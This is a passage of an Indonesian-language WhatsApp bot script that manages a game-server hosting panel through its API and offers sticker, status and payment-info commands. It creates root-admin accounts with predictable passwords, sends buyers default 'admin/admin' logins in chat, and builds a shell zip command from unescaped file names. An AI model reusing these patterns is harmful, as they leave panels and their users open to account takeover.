    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey2
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await kalz.sendMessage(m.chat, { text: messageText }, { quoted: fcall });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "listusr": {
  if (!isCreator) return reply(mess.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await kalz.sendMessage(m.chat, { text: messageText }, { quoted: fcall });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "delsrv": {
      if (!isCreator) return reply(`KHUSUS OWN`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case "delusr": {
  if (!isCreator) return reply(`KHUSUS OWNER`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
case "addusr": {
if (!isCreator) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let s = text.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let u = m.quoted ? m.quoted.sender : s[1] ? s[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await kalz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : s[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal2}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`

let sections = [{
title: 'Paket Server Panel',
highlight_label: 'Recomended 🔥',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,0/0,0`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,1200/1200,50`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,2200/2200,70`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,3200/3200,100`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,4200/4200,125`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,5200/5200,150`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,6200/6200,175`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,7200/7200,175`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,8200/8200,200`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By KalzxFluit', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kalz.decodeJid(kalz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`Please choose the size you want to buy`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/2396b22796cc175c80f28.jpg" } }, { upload: kalz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
kalz.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
case "admin": {
if (!isCreator) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *KalzxBotz – New Version* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Silakan Login Dengan Info Akun Di Bawah 😁`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})

} 
break
case "listadmin": {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await kalz.sendMessage(m.chat, { text: messageText }, { quoted: fcall });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "addsrv": {
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case 'spanel': case 'sendpanel': {
		 if (!isCreator) return reply(`NGAPAIN ANJG`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,harga,linklog`)
            reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
kalz.sendMessage(mq1, {text:`*───❖》KalzxFluitl《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal2}*\n*Jam : ${time}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : admin*\n*[+] Password : admin*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n`}, m) 
                 }
            break             
case "webpanel":
if (!isCreator) return reply(mess.OnlyOwner)
ewe = `nih kak ${domain}`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'suspend': {
            if (!isCreator) return reply(`Owner Only Feature`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL SUSPEND..*')
        }
            break
case 'unsuspend': {
            if (!isCreator) return reply(`Sory Cik Lu Siapa Bjirr`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
let action = command.replace('srv', '')
if (!isCreator) return reply('kusus Owner')
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"signal": action
})
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ${action.toUpperCase()} THE SERVER*`)
}
break
case 'tutorial': {
await loading()
tut = `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Tutorial Run Via Panel
https://youtu.be/rqqxkI4P8YY`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: tut,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
//=================================================//
case 'backup':
        {
          if (!isCreator) return reply(mess.owner)
     await reply("Sabar Mas Lagi Backup!!!");
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "haikal" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
          const exec = await execSync(`zip -r Kayy.zip ${ls.join(" ")}`);
          await kalz.sendMessage(
            m.chat,
            {
              document: await fs.readFileSync("./Kayy.zip"),
              mimetype: "application/zip",
              fileName: "cpanelKayy.zip",
            },
            { quoted: fcall }
          );
          await execSync("rm -rf Kayy.zip");
        }
        break
// ======================
//=================================================//
case 'hdr': {
await loading() 
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			kalz.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: fcall})
			}
			break
case 'getcase': {

const getCase = (cases) => {

            return "case "+`'${cases}'`+fs.readFileSync("./kalz.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"

        }
            try{

                if (!isCreator) return reply('ngapain')

                if (!q) return reply(`contoh : ${prefix + command} antilink`)

                let nana = await getCase(q)

                reply(nana)

            } catch(err){

            console.log(err)

            reply(`Case ${q} tidak di temukan`)

        }
}
        break 
case 'biochange':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'enable') {
                    autobio = true
                    reply(`Berhasil Mengubah AutoBio Ke ${q}`)
                } else if (q == 'disable') {
                    autobio = false
                    reply(`Berhasil Mengubah AutoBio Ke ${q}`)
                }
                break   
case 'autobio': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *KalzxBotz – New Version* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`click button *enable* to enable autobio\nclick button *disable* to disable autobio`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".biochange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".biochange disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'readchange':
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`Contoh ${prefix + command} enable/disable`)
if (q === 'enable') {
autoread = true
m.reply(`Berhasil mengubah autoread ke ${q}`)
} else if (q === 'disable') {
autoread = false
m.reply(`Berhasil mengubah autoread ke ${q}`)
}
break
case 'autoread': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *KalzxBotz – New Version* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`click button *enable* to enable autoread\nclick button *disable* to disable autoread`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".readchange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".readchange disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'qc': {
if (!q) return reply(`📌Example: ${prefix + command} hallo`)
let obj = {
type: 'quote',
format: 'png',
backgroundColor: '#ffffff',
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await kalz.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: `${q}`,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
kalz.sendImageAsSticker(m.chat, buffer, fcall, { packname: `${global.packname}`, author: `${global.author}`})
}
break
case 'payment': {
await kalz.sendMessage(m.chat, { react: { text: "⏰",key: m.key,}})  
const url = `${qris}`
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: kalz.waUploadToServer
  })
  return imageMessage
}


    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {text: '𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗕𝗬 : 𝗛𝗔𝗜𝗞𝗔𝗟 ㋡' },
              carouselMessage: {
                cards: [
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `▬▬▬▬▬𓊈 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𓊉▬▬▬▬▬
> ❐ 𝗗𝗔𝗡𝗔 : 𝟬𝟴𝟵𝟱𝟮𝟴𝟭𝟱𝟳𝟬𝟯𝟴
> ❐ 𝗢𝗩𝗢 : 𝟬𝟴𝟵𝟱𝟮𝟴𝟭𝟱𝟳𝟬𝟯𝟴
> ❐ 𝗚𝗢𝗣𝗔𝗬 : 𝟬𝟴𝟵𝟱𝟮𝟴𝟭𝟱𝟳𝟬𝟯𝟴
> ❐ 𝗤𝗥𝗜𝗦𝗦 : 𝗦𝗜𝗟𝗔𝗞𝗔𝗡 𝗦𝗖𝗔𝗡 𝗕𝗔𝗥𝗖𝗢𝗗𝗘 𝗤𝗥𝗜𝗦 𝗗𝗜 𝗔𝗧𝗔𝗦 ↑
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

> 𝗦𝗘𝗧𝗘𝗟𝗔𝗛 𝗧𝗥𝗔𝗡𝗦𝗙𝗘𝗥, 𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗨𝗞𝗧𝗜 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗡𝗬𝗔 ㋡` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
  buttonParamsJson: `{"display_text":"𝗢𝘄𝗻𝗲𝗿 ッ","url":"https://wa.me/6289528157038","merchant_url":"https://www.google.com"}`,
                        },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(url),
                      hasMediaAttachment: true,
                    },
                    body: { text: `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

> ⊱ 𝗦𝗲𝘁𝗲𝗹𝗮𝗵 𝗦𝘂𝗸𝘀𝗲𝘀 𝗧𝗿𝗮𝗻𝘀𝗳𝗲𝗿, 𝗖𝗼𝘀𝘁𝘂𝗺𝗲𝗿 𝗗𝗶 𝗪𝗮𝗷𝗶𝗯𝗸𝗮𝗻 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗸𝘁𝗶 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗞𝗲𝗽𝗮𝗱𝗮 𝗢𝘄𝗻𝗲𝗿
> ⊱ 𝗞𝗶𝗿𝗶𝗺 𝗕𝘂𝗸𝘁𝗶 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗦𝗲𝗰𝗮𝗿𝗮 𝗗𝗲𝘁𝗮𝗶𝗹, 𝗗𝗮𝗻 𝗞𝗹𝗶𝗸 𝗕𝘂𝘁𝘁𝗼𝗻 𝗢𝘄𝗻𝗲𝗿 𝗗𝗶 𝗕𝗮𝘄𝗮𝗵 𝗨𝗻𝘁𝘂𝗸 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗸𝘁𝗶 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
© 𝗞𝗮𝗹𝘇𝘅-𝗕𝗼𝘁𝘇 [ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 𝟭.𝟴 ]
` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
  buttonParamsJson: `{"display_text":"𝗢𝘄𝗻𝗲𝗿 ッ","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`,
                        },
                      ],
                    },
                  },

                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      {}
    );

    await kalz.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await kalz.sendImageAsStickerAV(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await kalz.sendVideoAsSticker(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
case 'public': {
if (!isCreator) return reply(mess.owner) 
kalz.public = true
reply('*_Sukse Change To Public_*')
}
break
case 'self': {
if (!isCreator) return reply(mess.owner) 
kalz.public = false
reply('*_Sukses Change To Self_*')
}
break
        case "upsw": {
          if (!isCreator) return reply("Owners only");
          if (args.length < 1) return reply("perihal apa?");
          if (/image/.test(mime)) {
            let imgSw = await kalz.downloadAndSaveMediaMessage(quoted);
            await kalz.sendMessage(
              "status@broadcast",
              { image: { url: imgSw }, caption: q },
              { statusJidList: pendaftar },
            );
            reply("Udah Hiyuu, Liat Aja Kalo Ga Percaya 😋");
          } else if (/video/.test(mime)) {
            let VidSw = await kalz.downloadAndSaveMediaMessage(quoted);
            await kalz.sendMessage(
              "status@broadcast",
              { video: { url: VidSw }, caption: q },
              { statusJidList: pendaftar },
            );
            reply("Done");
          } else if (/audio/.test(mime)) {
            let VnSw = await kalz.downloadAndSaveMediaMessage(quoted);
            await kalz.sendMessage(
              "status@broadcast",
              { audio: { url: VnSw }, mimetype: "audio/mp4", ptt: true },
              { backgroundColor: "#d3d3d3", statusJidList: pendaftar }, // #d3d3d3
            );
            reply("Done");
          } else if (q) {
            kalz.sendMessage(
              "status@broadcast",
              { text: q },
              {
                backgroundColor: "#FF000000",
                font: 3,
                statusJidList: pendaftar,
              },
            );
          } else {
            reply(
              "Replay Media Jika Mau Dengan Caption Ketik .upsw caption",
            );
          }
        }
        break;
        
        case "getsw": {
          if (m.quoted?.chat != "status@broadcast")
            return reply(`Reply Status WhatsApp !`);
          let buffer = await m.quoted.download();
          await kalz.sendFile(
            m.chat,
            buffer,
            "",
            m.quoted.text || "",
            null,
            false,
            { quoted: m },
          ).catch((_) => reply(m.quoted.text || ""));
        }
        break;

      case "listsw": {
          if (!isCreator) return reply("Perihal Apa?")
          if (!store.messages["status@broadcast"].array.length === 0)
            throw "Gaada 1 status pun";
          let stories = store.messages["status@broadcast"].array;
          let story = stories.filter(
            (v) => v.message && v.message.protocolMessage?.type !== 0,
          );
          if (story.length === 0) throw "Status gaada";
          const result = {};
          story.forEach((obj) => {
            let participant = obj.key.participant || obj.participant;
            participant = jidNormalizedUser(
              participant === "status_me" ? kalz.user.id : participant,
            );
            if (!result[participant]) {
              result[participant] = [];
            }
            result[participant].push(obj);
          });
          let type = (mType) =>
            getContentType(mType) === "extendedTextMessage"
              ? "text"
              : getContentType(mType).replace("Message", "");
          let text = "";
          for (let id of Object.keys(result)) {
            if (!id) return;
            text += `*- ${await kalz.getName(id)}*\n`;
            text += `${result[id].map((v, i) => `${i + 1}. ${type(v.message)}`).join("\n")}\n\n`;
          }
          await reply(text.trim(), { mentions: Object.keys(result) });
        }
        break;
        
case 'owner': {
const kontak = {
"displayName": 'My Owner',
